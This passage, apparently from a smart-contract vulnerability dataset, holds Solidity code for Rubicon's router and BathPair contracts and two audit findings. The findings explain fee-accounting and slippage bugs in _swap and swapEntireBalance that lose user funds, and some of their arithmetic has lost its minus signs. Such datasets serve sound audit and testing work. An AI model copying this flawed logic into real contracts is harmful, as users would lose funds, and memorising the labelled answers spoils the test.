asks[index] = [_ask_pay_amt, _ask_buy_amt, bestAskID];\n                bids[index] = [_bid_pay_amt, _bid_buy_amt, bestBidID];\n                continue;\n            }\n            uint256 nextBestAsk = RubiconMarket(_RubiconMarketAddress)\n            .getWorseOffer(lastAsk);\n            uint256 nextBestBid = RubiconMarket(_RubiconMarketAddress)\n            .getWorseOffer(lastBid);\n            (uint256 ask_pay_amt, , uint256 ask_buy_amt, ) = RubiconMarket(\n                _RubiconMarketAddress\n            ).getOffer(nextBestAsk);\n            (uint256 bid_pay_amt, , uint256 bid_buy_amt, ) = RubiconMarket(\n                _RubiconMarketAddress\n            ).getOffer(nextBestBid);\n\n            asks[index] = [ask_pay_amt, ask_buy_amt, nextBestAsk];\n            bids[index] = [bid_pay_amt, bid_buy_amt, nextBestBid];\n            // bids[index] = nextBestBid;\n            lastBid = nextBestBid;\n            lastAsk = nextBestAsk;\n        }\n\n        //3. Return those topNOrders for either side of the order book\n        return (asks, bids, topNOrders);\n    }\n\n    /// @dev this function returns the best offer for a pair's id and info\n    function getBestOfferAndInfo(address asset, address quote)\n        public\n        view\n        returns (\n            uint256, //id\n            uint256,\n            ERC20,\n            uint256,\n            ERC20\n        )\n    {\n        address _market = RubiconMarketAddress;\n        uint256 offer = RubiconMarket(_market).getBestOffer(\n            ERC20(asset),\n            ERC20(quote)\n        );\n        (\n            uint256 pay_amt,\n            ERC20 pay_gem,\n            uint256 buy_amt,\n            ERC20 buy_gem\n        ) = RubiconMarket(_market).getOffer(offer);\n        return (offer, pay_amt, pay_gem, buy_amt, buy_gem);\n    }\n\n    // function for infinite approvals of Rubicon Market\n    function approveAssetOnMarket(address toApprove) public {\n        // Approve exchange\n        ERC20(toApprove).approve(RubiconMarketAddress, 2**256 - 1);\n    }\n\n    /// @dev this function takes the same parameters of swap and returns the expected amount\n    function getExpectedSwapFill(\n        uint256 pay_amt,\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS //20\n    ) public view returns (uint256 fill_amt) {\n        address _market = RubiconMarketAddress;\n        uint256 currentAmount = 0;\n        for (uint256 i = 0; i < route.length - 1; i++) {\n            (address input, address output) = (route[i], route[i + 1]);\n            uint256 _pay = i == 0\n                ? pay_amt\n                : (\n                    currentAmount.sub(\n                        currentAmount.mul(expectedMarketFeeBPS).div(10000)\n                    )\n                );\n            uint256 wouldBeFillAmount = RubiconMarket(_market).getBuyAmount(\n                ERC20(output),\n                ERC20(input),\n                _pay\n            );\n            currentAmount = wouldBeFillAmount;\n        }\n        require(currentAmount >= buy_amt_min, \"didnt clear buy_amt_min\");\n\n        // Return the wouldbe resulting swap amount\n        return (currentAmount);\n    }\n\n    /// @dev This function lets a user swap from route[0] -> route[last] at some minimum expected rate\n    /// @dev pay_amt - amount to be swapped away from msg.sender of *first address in path*\n    /// @dev buy_amt_min - target minimum received of *last address in path*\n    function swap(\n        uint256 pay_amt,\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS //20\n    ) public returns (uint256) {\n        //**User must approve this contract first**\n        //transfer needed amount here first\n        ERC20(route[0]).transferFrom(\n            msg.sender,\n            address(this),\n            pay_amt.add(pay_amt.mul(expectedMarketFeeBPS).div(10000)) // Account for expected fee\n        );\n        return\n            _swap(\n                pay_amt,\n                buy_amt_min,\n                route,\n                expectedMarketFeeBPS,\n                msg.sender\n            );\n    }\n\n    // Internal function requires that ERC20s are here before execution\n    function _swap(\n        uint256 pay_amt,\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS,\n        address to // Recipient of swap outputs!\n    ) internal returns (uint256) {\n        address _market = RubiconMarketAddress;\n        uint256 currentAmount = 0;\n        for (uint256 i = 0; i < route.length - 1; i++) {\n            (address input, address output) = (route[i], route[i + 1]);\n            uint256 _pay = i == 0\n                ? pay_amt\n                : (\n                    currentAmount.sub(\n                        currentAmount.mul(expectedMarketFeeBPS).div(10000)\n                    )\n                );\n            if (ERC20(input).allowance(address(this), _market) == 0) {\n                approveAssetOnMarket(input);\n            }\n            uint256 fillAmount = RubiconMarket(_market).sellAllAmount(\n                ERC20(input),\n                _pay,\n                ERC20(output),\n                0 //naively assume no fill_amt here for loop purposes?\n            );\n            currentAmount = fillAmount;\n        }\n        require(currentAmount >= buy_amt_min, \"didnt clear buy_amt_min\");\n\n        // send tokens back to sender if not keeping here\n        if (to != address(this)) {\n            ERC20(route[route.length - 1]).transfer(to, currentAmount);\n        }\n\n        emit LogSwap(\n            pay_amt,\n            route[0],\n            buy_amt_min,\n            route[route.length - 1],\n            keccak256(abi.encodePacked(route[0], route[route.length - 1])),\n            currentAmount,\n            to\n        );\n        return currentAmount;\n    }\n\n    /// @dev this function takes a user's entire balance for the trade in case they want to do a max trade so there's no leftover dust\n    function swapEntireBalance(\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS\n    ) external returns (uint256) {\n        //swaps msg.sender entire balance in the trade\n        uint256 maxAmount = ERC20(route[0]).balanceOf(msg.sender);\n        ERC20(route[0]).transferFrom(\n            msg.sender,\n            address(this),\n            maxAmount // Account for expected fee\n        );\n        return\n            _swap(\n                maxAmount,\n                maxAmount.sub(buy_amt_min.mul(expectedMarketFeeBPS).div(10000)), //account for fee\n                route,\n                expectedMarketFeeBPS,\n                msg.sender\n            );\n    }\n\n    /// @dev this function takes a user's entire balance for the trade in case they want to do a max trade so there's no leftover dust\n    function maxBuyAllAmount(\n        ERC20 buy_gem,\n        ERC20 pay_gem,\n        uint256 max_fill_amount\n    ) external returns (uint256 fill) {\n        //swaps msg.sender's entire balance in the trade\n        uint256 maxAmount = ERC20(buy_gem).balanceOf(msg.sender);\n        fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(\n            buy_gem,\n            maxAmount,\n            pay_gem,\n            max_fill_amount\n        );\n        ERC20(buy_gem).transfer(msg.sender, fill);\n    }\n\n    /// @dev this function takes a user's entire balance for the trade in case they want to do a max trade so there's no leftover dust\n    function maxSellAllAmount(\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill) {\n        //swaps msg.sender entire balance in the trade\n        uint256 maxAmount = ERC20(buy_gem).balanceOf(msg.sender);\n        fill = RubiconMarket(RubiconMarketAddress).sellAllAmount(\n            pay_gem,\n            maxAmount,\n            buy_gem,\n            min_fill_amount\n        );\n        ERC20(buy_gem).transfer(msg.sender, fill);\n    }\n\n    // ** Native ETH Wrapper Functions **\n    /// @dev WETH wrapper functions to obfuscate WETH complexities from ETH holders\n    function buyAllAmountWithETH(\n        ERC20 buy_gem,\n        uint256 buy_amt,\n        uint256 max_fill_amount,\n        uint256 expectedMarketFeeBPS\n    ) external payable returns (uint256 fill) {\n        address _weth = address(wethAddress);\n        uint256 _before = ERC20(_weth).balanceOf(address(this));\n        uint256 max_fill_withFee = max_fill_amount.add(\n            max_fill_amount.mul(expectedMarketFeeBPS).div(10000)\n        );\n        require(\n            msg.value >= max_fill_withFee,\n            \"must send as much ETH as max_fill_withFee\"\n        );\n        WETH9(wethAddress).deposit{value: max_fill_withFee}(); // Pay with native ETH -> WETH\n        // An amount in WETH\n        fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(\n            buy_gem,\n            buy_amt,\n            ERC20(wethAddress),\n            max_fill_amount\n        );\n        ERC20(buy_gem).transfer(msg.sender, buy_amt);\n\n        uint256 _after = ERC20(_weth).balanceOf(address(this));\n        uint256 delta = _after - _before;\n\n        // Return unspent coins to sender\n        if (delta > 0) {\n            WETH9(wethAddress).withdraw(delta);\n            msg.sender.transfer(delta);\n        }\n    }\n\n    // Paying ERC20 to buy native ETH\n    function buyAllAmountForETH(\n        uint256 buy_amt,\n        ERC20 pay_gem,\n        uint256 max_fill_amount\n    ) external returns (uint256 fill) {\n        ERC20(pay_gem).transferFrom(msg.sender, address(this), max_fill_amount); //transfer pay here\n        fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(\n            ERC20(wethAddress),\n            buy_amt,\n            pay_gem,\n            max_fill_amount\n        );\n        WETH9(wethAddress).withdraw(buy_amt); // Fill in WETH\n        msg.sender.transfer(buy_amt); // Return native ETH\n        // Return unspent coins to sender\n        if (max_fill_amount > fill) {\n            ERC20(pay_gem).transfer(msg.sender, max_fill_amount - fill);\n        }\n        return fill;\n    }\n\n    // Pay in native ETH\n    function offerWithETH(\n        uint256 pay_amt, //maker (ask) sell how much\n        // ERC20 nativeETH, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        ERC20 buy_gem, //maker (ask) buy which token\n        uint256 pos //position to insert offer, 0 should be used if unknown\n    ) external payable returns (uint256) {\n        require(\n            msg.value >= pay_amt,\n            \"didnt send enough native ETH for WETH offer\"\n        );\n        uint256 _before = ERC20(buy_gem).balanceOf(address(this));\n        WETH9(wethAddress).deposit{value: pay_amt}();\n        uint256 id = RubiconMarket(RubiconMarketAddress).offer(\n            pay_amt,\n            ERC20(wethAddress),\n            buy_amt,\n            buy_gem,\n            pos\n        );\n        uint256 _after = ERC20(buy_gem).balanceOf(address(this));\n        if (_after > _before) {\n            //return any potential fill amount on the offer\n            ERC20(buy_gem).transfer(msg.sender, _after - _before);\n        }\n        return id;\n    }\n\n    // Pay in native ETH\n    function offerForETH(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        // ERC20 nativeETH, //maker (ask) buy which token\n        uint256 pos //position to insert offer, 0 should be used if unknown\n    ) external returns (uint256) {\n        ERC20(pay_gem).transferFrom(msg.sender, address(this), pay_amt);\n\n        uint256 _before = ERC20(wethAddress).balanceOf(address(this));\n        uint256 id = RubiconMarket(RubiconMarketAddress).offer(\n            pay_amt,\n            pay_gem,\n            buy_amt,\n            ERC20(wethAddress),\n            pos\n        );\n        uint256 _after = ERC20(wethAddress).balanceOf(address(this));\n        if (_after > _before) {\n            //return any potential fill amount on the offer as native ETH\n            uint256 delta = _after - _before;\n            WETH9(wethAddress).withdraw(delta);\n            msg.sender.transfer(delta);\n        }\n        return id;\n    }\n\n    // Cancel an offer made in WETH\n    function cancelForETH(uint256 id) external returns (bool outcome) {\n        (uint256 pay_amt, ERC20 pay_gem, , ) = RubiconMarket(\n            RubiconMarketAddress\n        ).getOffer(id);\n        require(\n            address(pay_gem) == wethAddress,\n            \"trying to cancel a non WETH order\"\n        );\n        // Cancel order and receive WETH here in amount of pay_amt\n        outcome = RubiconMarket(RubiconMarketAddress).cancel(id);\n        WETH9(wethAddress).withdraw(pay_amt);\n        msg.sender.transfer(pay_amt);\n    }\n\n    // Deposit native ETH -> WETH pool\n    function depositWithETH(uint256 amount, address targetPool)\n        external\n        payable\n        returns (uint256 newShares)\n    {\n        IERC20 target = IBathToken(targetPool).underlyingToken();\n        require(target == ERC20(wethAddress), \"target pool not weth pool\");\n        require(msg.value >= amount, \"didnt send enough eth\");\n\n        if (target.allowance(address(this), targetPool) == 0) {\n            target.approve(targetPool, amount);\n        }\n\n        WETH9(wethAddress).deposit{value: amount}();\n        newShares = IBathToken(targetPool).deposit(amount);\n        //Send back bathTokens to sender\n        ERC20(targetPool).transfer(msg.sender, newShares);\n    }\n\n    // Withdraw native ETH <- WETH pool\n    function withdrawForETH(uint256 shares, address targetPool)\n        external\n        payable\n        returns (uint256 withdrawnWETH)\n    {\n        IERC20 target = IBathToken(targetPool).underlyingToken();\n        require(target == ERC20(wethAddress), \"target pool not weth pool\");\n        require(\n            IBathToken(targetPool).balanceOf(msg.sender) >= shares,\n            \"don't own enough shares\"\n        );\n        IBathToken(targetPool).transferFrom(msg.sender, address(this), shares);\n        withdrawnWETH = IBathToken(targetPool).withdraw(shares);\n        WETH9(wethAddress).withdraw(withdrawnWETH);\n\n        //Send back withdrawn native eth to sender\n        msg.sender.transfer(withdrawnWETH);\n    }\n\n    function swapWithETH(\n        uint256 pay_amt,\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS\n    ) external payable returns (uint256) {\n        require(route[0] == wethAddress, \"Initial value in path not WETH\");\n        uint256 amtWithFee = pay_amt.add(\n            pay_amt.mul(expectedMarketFeeBPS).div(10000)\n        );\n        require(\n            msg.value >= amtWithFee,\n            \"must send enough native ETH to pay as weth and account for fee\"\n        );\n        WETH9(wethAddress).deposit{value: amtWithFee}();\n        return\n            _swap(\n                pay_amt,\n                buy_amt_min,\n                route,\n                expectedMarketFeeBPS,\n                msg.sender\n            );\n    }\n\n    function swapForETH(\n        uint256 pay_amt,\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS\n    ) external payable returns (uint256 fill) {\n        require(\n            route[route.length - 1] == wethAddress,\n            \"target of swap is not WETH\"\n        );\n        //Transfer tokens here first and account for fee\n        require(\n            ERC20(route[0]).transferFrom(\n                msg.sender,\n                address(this),\n                pay_amt.add(pay_amt.mul(expectedMarketFeeBPS).div(10000))\n            ),\n            \"initial ERC20 transfer failed\"\n        );\n        fill = _swap(\n            pay_amt,\n            buy_amt_min,\n            route,\n            expectedMarketFeeBPS,\n            address(this)\n        );\n\n        WETH9(wethAddress).withdraw(fill);\n        // msg.sender.transfer(fill);\n        msg.sender.transfer(fill);\n    }\n}\n\n\n",
        "CodeNames": [
            "RubiconRouter.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-06",
                "Location": [
                    "_swap"
                ],
                "Type": " RubiconRouter _swap does not pass whole amount to RubiconMarket",
                "Description": "\nWhen swapping amongst multiple pairs in RubiconRouter's _swap, the fee is wrongly accounted for.\n\n\nNot all of the user's funds would be forwarded to RubiconMarket, therefore the user would lose funds.\n\n\nThe _swap function is calculating the pay amount to send to RubiconMarket.sellAllAmount to be(https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L232):\n\n    currentAmount.sub(currentAmount.mul(expectedMarketFeeBPS).div(10000)\n\nBut this would lead to not all of the funds being pulled by RubiconMarket.\nI mathematically show this in this image(https://i.ibb.co/J5678C3/c4amountlost.jpg).\nThe correct parameter that needs to be sent to sellAllAmount is:\n\n    currentAmount.sub(currentAmount.mul(expectedMarketFeeBPS).div(10000+expectedMarketFeeBPS)\n\nI mathematically prove this in this image(https://i.ibb.co/xHzYfzF/c4newparam.jpg).\n\n",
                "Repair": "\nChange the parameter to the abovementioned one.\n\nbghughes (Rubicon) confirmed(https://github.com/code-423n4/2022-05-rubicon-findings/issues/104)\n\nHickupHH3 (judge) commented(https://github.com/code-423n4/2022-05-rubicon-findings/issues/104#issuecomment-1157505244):\n  For the benefit of readers who aren't as math savvy, let's work this out with a numerical example.\n \n Let's assume a 1% fee: expectedMarketFeeBPS = 100.\n The RubiconMarket charges and pulls this fee separately, so if I have a trade amount of 100, what would be the actual amount to pass into the function? \n \n The current implementation is 100 1% * 100 = 100 1 = 99. However, if that's the case, the market charges 1% of 99 instead, which is 0.99. Hence, the total amount used is 99 + 0.99 = 99.99, leaving a dust amount of 0.01.\n \n Thus, as the warden has proven mathematically, the formula should be 100 100 * 100 / (10_000 + 100) ~= 99.0099. Then, the 1% fee charged is 0.990099..., making the total approximately equal to 100 (rounding errors).\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-07",
                "Location": [
                    "sol\n    function swapEntireBalance(\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS\n    ) external returns (uint256) {\n        //swaps msg.sender entire balance in the trade\n        uint256 maxAmount = ERC20(route[0]).balanceOf(msg.sender);\n        ERC20(route[0]).transferFrom(\n            msg.sender,\n            address(this),\n            maxAmount // Account for expected fee\n        );\n        return\n            _swap(\n                maxAmount,\n                maxAmount.sub(buy_amt_min.mul(expectedMarketFeeBPS).div(10000)), //account for fee\n                route,\n                expectedMarketFeeBPS,\n                msg.sender\n            );\n    }\n",
                    "sol\namount = 100\nbuy_amt_min = 99\nexpectedMarketFeeBPS = 500 // 5%\n\nactual buy_amy_min = 100 (99 * (500 / 10000)) = 95.05\n"
                ],
                "Type": " RubiconRouter.swapEntireBalance() doesn't handle the slippage check properly",
                "Description": "\nThe swapEntireBalance() function allows the user to pass a buy_amt_min value which is the minimum number of tokens they should receive from the swap. But, the function doesn't pass the value to the underlying swap() function. Thus, the user's min value will be ignored. Since that will result in unexpected outcomes where user funds might be lost, I rate this issue as HIGH.\n\n\nswapEntireBalance():\n\nsol\n    function swapEntireBalance(\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS\n    ) external returns (uint256) {\n        //swaps msg.sender entire balance in the trade\n        uint256 maxAmount = ERC20(route[0]).balanceOf(msg.sender);\n        ERC20(route[0]).transferFrom(\n            msg.sender,\n            address(this),\n            maxAmount // Account for expected fee\n        );\n        return\n            _swap(\n                maxAmount,\n                maxAmount.sub(buy_amt_min.mul(expectedMarketFeeBPS).div(10000)), //account for fee\n                route,\n                expectedMarketFeeBPS,\n                msg.sender\n            );\n    }\n\n\nThe second parameter of the _swap() call should be the min out value. Instead maxAmount.sub(buy_amt_min.mul(expectedMarketFeeBPS).div(10000)) is used.\n\nExample:\n\nsol\namount = 100\nbuy_amt_min = 99\nexpectedMarketFeeBPS = 500 // 5%\n\nactual buy_amy_min = 100 (99 * (500 / 10000)) = 95.05\n\n\nSo instead of using 99 the function uses 95.05 which could result in the user receiving fewer tokens than they expected.\n\n",
                "Repair": "\nPass buy_amt_min directly to _swap().\n\nbghughes (Rubicon) marked as duplicate(https://github.com/code-423n4/2022-05-rubicon-findings/issues/52#issuecomment-1146688694):\n  Duplicate of #104(https://github.com/code-423n4/2022-05-rubicon-findings/issues/104).\n\nHickupHH3 (judge) commented(https://github.com/code-423n4/2022-05-rubicon-findings/issues/52#issuecomment-1157513876):\n  Not a duplicate. This has to do with applying a fee on buy_amt_min instead of passing the actual value directly. Lower slippage tolerance means potential loss of funds, hence the high severity.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: BUSL-1.1\n\n/// @author Rubicon DeFi Inc. - bghughes.eth\n/// @notice This contract allows a strategist to use user funds in order to market make for a Rubicon pair\n/// @notice The BathPair is the admin for the pair's liquidity and has many security checks in place\n/// @notice This contract is also where strategists claim rewards for successful market making\n\npragma solidity =0.7.6;\npragma experimental ABIEncoderV2;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"../interfaces/IBathToken.sol\";\nimport \"../interfaces/IBathHouse.sol\";\nimport \"../interfaces/IRubiconMarket.sol\";\nimport \"../interfaces/IStrategistUtility.sol\";\n\ncontract BathPair {\n    /// *** Libraries ***\n    using SafeMath for uint256;\n    using SafeMath for uint16;\n\n    /// *** Storage Variables ***\n\n    /// @notice The Bath House admin of this contract; used with onlyBathHouse()\n    address public bathHouse;\n\n    /// @notice The Rubicon Market strategists direct all activity towards. There is only one market, RubiconMarket.sol, in the Rubicon Protocol\n    address public RubiconMarketAddress;\n\n    /// @notice The initialization status of BathPair\n    bool public initialized;\n\n    /// @dev Keeping deprecated variables maintains consistent network-agnostic contract abis when moving to new chains and versions\n    int128 internal deprecatedStorageVarKept420Proxy;\n\n    /// @notice Intentionally unused DEPRECATED STORAGE VARIABLE to maintain contiguous state on proxy-wrapped contracts. Consider it a beautiful scar of incremental progress \ud83d\udcc8\n    /// @dev Keeping deprecated variables maintains consistent network-agnostic contract abis when moving to new chains and versions\n    uint256 public deprecatedStorageVarKept4Proxy;\n\n    /// @dev The id of the last StrategistTrade made by any strategist on this contract\n    /// @dev This value is globally unique, and increments with every trade\n    uint256 internal last_stratTrade_id;\n\n    /// @notice The total amount of successful offer fills that all strategists have made for a given asset\n    mapping(address => uint256) public totalFillsPerAsset;\n\n    /// @notice Unique id => StrategistTrade created in marketMaking call\n    mapping(uint256 => StrategistTrade) public strategistTrades;\n\n    /// @notice Map a strategist to their outstanding order IDs\n    mapping(address => mapping(address => mapping(address => uint256[])))\n        public outOffersByStrategist;\n\n    /// @notice Tracks the market-kaing fill amounts on a per-asset basis of a strategist\n    /// @dev strategist => erc20asset => fill amount per asset;\n    mapping(address => mapping(address => uint256)) public strategist2Fills;\n\n    /// *** Structs ***\n\n    struct order {\n        uint256 pay_amt;\n        IERC20 pay_gem;\n        uint256 buy_amt;\n        IERC20 buy_gem;\n    }\n\n    struct StrategistTrade {\n        uint256 askId;\n        uint256 askPayAmt;\n        address askAsset;\n        uint256 bidId;\n        uint256 bidPayAmt;\n        address bidAsset;\n        address strategist;\n        uint256 timestamp;\n    }\n\n    /// *** Events ***\n\n    /// @notice Log a new market-making trade placed by a strategist, resulting in a StrategitTrade\n    event LogStrategistTrade(\n        uint256 strategistTradeID,\n        bytes32 askId,\n        bytes32 bidId,\n        address askAsset,\n        address bidAsset,\n        uint256 timestamp,\n        address strategist\n    );\n\n    /// @notice Logs the cancellation of a StrategistTrade\n    event LogScrubbedStratTrade(\n        uint256 strategistIDScrubbed,\n        uint256 assetFill,\n        address assetAddress,\n        address bathAssetAddress,\n        uint256 quoteFill,\n        address quoteAddress,\n        address bathQuoteAddress\n    );\n\n    /// @notice Log when a strategist claims their market-making rewards (effectively a rebate for good performance)\n    event LogStrategistRewardClaim(\n        address strategist,\n        address asset,\n        uint256 amountOfReward,\n        uint256 timestamp\n    );\n\n    /// *** External Functions ***\n\n    /// @notice Constructor-like initialization function\n    /// @dev Proxy-safe initialization of storage\n    function initialize(uint256 _maxOrderSizeBPS, int128 _shapeCoefNum)\n        external\n    {\n        require(!initialized);\n        address _bathHouse = msg.sender; //Assume the initializer is BathHouse\n        require(\n            IBathHouse(_bathHouse).getMarket() !=\n                address(0x0000000000000000000000000000000000000000) &&\n                IBathHouse(_bathHouse).initialized(),\n            \"BathHouse not initialized\"\n        );\n        bathHouse = _bathHouse;\n\n        RubiconMarketAddress = IBathHouse(_bathHouse).getMarket();\n\n        // Shape variables for dynamic inventory management\n        /// *** DEprecate but keep storage variable on OP\n        deprecatedStorageVarKept4Proxy = _maxOrderSizeBPS;\n\n        /// @dev A deprecated storage variable! Turns out order books are elegant and complex math is simply computed off-chain, and priced in on-chain orders at the speed of Ethereum L2s!\n        deprecatedStorageVarKept420Proxy = _shapeCoefNum;\n\n        initialized = true;\n    }\n\n    /// *** Modifiers ***\n\n    modifier onlyBathHouse() {\n        require(msg.sender == bathHouse);\n        _;\n    }\n\n    modifier onlyApprovedStrategist(address targetStrategist) {\n        require(\n            IBathHouse(bathHouse).isApprovedStrategist(targetStrategist) ==\n                true,\n            \"you are not an approved strategist - bathPair\"\n        );\n        _;\n    }\n\n    // *** Internal Functions ***\n\n    /// @notice This function enforces that the Bath House reserveRatio (a % of underlying pool liquidity) is enforced across all pools\n    /// @dev This function should ensure that reserveRatio % of the underlying liquidity always remains on the Bath Token. Utilization should be 1 - reserveRatio in practice assuming strategists use all available liquidity.\n    function enforceReserveRatio(\n        address underlyingAsset,\n        address underlyingQuote\n    )\n        internal\n        view\n        returns (address bathAssetAddress, address bathQuoteAddress)\n    {\n        bathAssetAddress = IBathHouse(bathHouse).tokenToBathToken(\n            underlyingAsset\n        );\n        bathQuoteAddress = IBathHouse(bathHouse).tokenToBathToken(\n            underlyingQuote\n        );\n        require(\n            (\n                IBathToken(bathAssetAddress).underlyingBalance().mul(\n                    IBathHouse(bathHouse).reserveRatio()\n                )\n            ).div(100) <= IERC20(underlyingAsset).balanceOf(bathAssetAddress),\n            \"Failed to meet asset pool reserve ratio\"\n        );\n        require(\n            (\n                IBathToken(bathQuoteAddress).underlyingBalance().mul(\n                    IBathHouse(bathHouse).reserveRatio()\n                )\n            ).div(100) <= IERC20(underlyingQuote).balanceOf(bathQuoteAddress),\n            \"Failed to meet quote pool reserve ratio\"\n        );\n    }\n\n    /// @notice Log whenever a strategist rebalances a fill amount and log the amount while incrementing total fills for that specific asset\n    /// @dev Only log fills for each strategist in an asset specific manner\n    /// @dev Goal is to map a strategist to a fill\n    function logFill(\n        uint256 amt,\n        address strategist,\n        address asset\n    ) internal {\n        strategist2Fills[strategist][asset] += amt;\n        totalFillsPerAsset[asset] += amt;\n    }\n\n    /// @notice Internal function to provide the next unique StrategistTrade ID\n    function _next_id() internal returns (uint256) {\n        last_stratTrade_id++;\n        return last_stratTrade_id;\n    }\n\n    /// @notice This function results in the removal of the Strategist Trade (bid and/or ask on Rubicon Market) from the books and it being deleted from the contract\n    /// @dev The local array of strategist IDs that exists for any given strategist [query via getOutstandingStrategistTrades()] acts as an acitve RAM for outstanding strategist trades\n    /// @dev Cancels outstanding orders and manages the ledger of outstandingAmount() on bathTokens as Strategist Trades are cancelled/scrubbed or expired\n    function handleStratOrderAtID(uint256 id) internal {\n        StrategistTrade memory info = strategistTrades[id];\n        address _asset = info.askAsset;\n        address _quote = info.bidAsset;\n\n        address bathAssetAddress = IBathHouse(bathHouse).tokenToBathToken(\n            _asset\n        );\n        address bathQuoteAddress = IBathHouse(bathHouse).tokenToBathToken(\n            _quote\n        );\n        order memory offer1 = getOfferInfo(info.askId); //ask\n        order memory offer2 = getOfferInfo(info.bidId); //bid\n        uint256 askDelta = info.askPayAmt - offer1.pay_amt;\n        uint256 bidDelta = info.bidPayAmt - offer2.pay_amt;\n\n        // if real\n        if (info.askId != 0) {\n            // if delta > 0 - delta is fill => handle any amount of fill here\n            if (askDelta > 0) {\n                logFill(askDelta, info.strategist, info.askAsset);\n                IBathToken(bathAssetAddress).removeFilledTradeAmount(askDelta);\n                // not a full fill\n                if (askDelta != info.askPayAmt) {\n                    IBathToken(bathAssetAddress).cancel(\n                        info.askId,\n                        info.askPayAmt.sub(askDelta)\n                    );\n                }\n            }\n            // otherwise didn't fill so cancel\n            else {\n                IBathToken(bathAssetAddress).cancel(info.askId, info.askPayAmt); // pas amount too\n            }\n        }\n\n        // if real\n        if (info.bidId != 0) {\n            // if delta > 0 - delta is fill => handle any amount of fill here\n            if (bidDelta > 0) {\n                logFill(bidDelta, info.strategist, info.bidAsset);\n                IBathToken(bathQuoteAddress).removeFilledTradeAmount(bidDelta);\n                // not a full fill\n                if (bidDelta != info.bidPayAmt) {\n                    IBathToken(bathQuoteAddress).cancel(\n                        info.bidId,\n                        info.bidPayAmt.sub(bidDelta)\n                    );\n                }\n            }\n            // otherwise didn't fill so cancel\n            else {\n                IBathToken(bathQuoteAddress).cancel(info.bidId, info.bidPayAmt); // pass amount too\n            }\n        }\n\n        // Delete the order from outOffersByStrategist\n        uint256 target = getIndexFromElement(\n            id,\n            outOffersByStrategist[_asset][_quote][info.strategist]\n        );\n        uint256[] storage current = outOffersByStrategist[_asset][_quote][\n            info.strategist\n        ];\n        current[target] = current[current.length - 1];\n        current.pop(); // Assign the last value to the value we want to delete and pop, best way to do this in solc AFAIK\n\n        emit LogScrubbedStratTrade(\n            id,\n            askDelta,\n            _asset,\n            bathAssetAddress,\n            bidDelta,\n            _quote,\n            bathQuoteAddress\n        );\n    }\n\n    /// @notice Get information about a Rubicon Market offer and return it as an order\n    function getOfferInfo(uint256 id) internal view returns (order memory) {\n        (\n            uint256 ask_amt,\n            IERC20 ask_gem,\n            uint256 bid_amt,\n            IERC20 bid_gem\n        ) = IRubiconMarket(RubiconMarketAddress).getOffer(id);\n        order memory offerInfo = order(ask_amt, ask_gem, bid_amt, bid_gem);\n        return offerInfo;\n    }\n\n    /// @notice A function that returns the index of uid from array\n    /// @dev uid must be in array for the purposes of this contract to enforce outstanding trades per strategist are tracked correctly\n    function getIndexFromElement(uint256 uid, uint256[] storage array)\n        internal\n        view\n        returns (uint256 _index)\n    {\n        bool assigned = false;\n        for (uint256 index = 0; index < array.length; index++) {\n            if (uid == array[index]) {\n                _index = index;\n                assigned = true;\n                return _index;\n            }\n        }\n        require(assigned, \"Didnt Find that element in live list, cannot scrub\");\n    }\n\n    // *** External Functions - Only Approved Strategists ***\n\n    /// @notice Key entry point for strategists to use Bath Token (LP) funds to place market-making trades on the Rubicon Order Book\n    function placeMarketMakingTrades(\n        address[2] memory tokenPair, // ASSET, Then Quote\n        uint256 askNumerator, // Quote / Asset\n        uint256 askDenominator, // Asset / Quote\n        uint256 bidNumerator, // size in ASSET\n        uint256 bidDenominator // size in QUOTES\n    ) public onlyApprovedStrategist(msg.sender) returns (uint256 id) {\n        // Require at least one order is non-zero\n        require(\n            (askNumerator > 0 && askDenominator > 0) ||\n                (bidNumerator > 0 && bidDenominator > 0),\n            \"one order must be non-zero\"\n        );\n\n        address _underlyingAsset = tokenPair[0];\n        address _underlyingQuote = tokenPair[1];\n\n        (\n            address bathAssetAddress,\n            address bathQuoteAddress\n        ) = enforceReserveRatio(_underlyingAsset, _underlyingQuote);\n\n        require(\n            bathAssetAddress != address(0) && bathQuoteAddress != address(0),\n            \"tokenToBathToken error\"\n        );\n\n        // Calculate new bid and/or ask\n        order memory ask = order(\n            askNumerator,\n            IERC20(_underlyingAsset),\n            askDenominator,\n            IERC20(_underlyingQuote)\n        );\n        order memory bid = order(\n            bidNumerator,\n            IERC20(_underlyingQuote),\n            bidDenominator,\n            IERC20(_underlyingAsset)\n        );\n\n        // Place new bid and/or ask\n        // Note: placeOffer returns a zero if an incomplete order\n        uint256 newAskID = IBathToken(bathAssetAddress).placeOffer(\n            ask.pay_amt,\n            ask.pay_gem,\n            ask.buy_amt,\n            ask.buy_gem\n        );\n\n        uint256 newBidID = 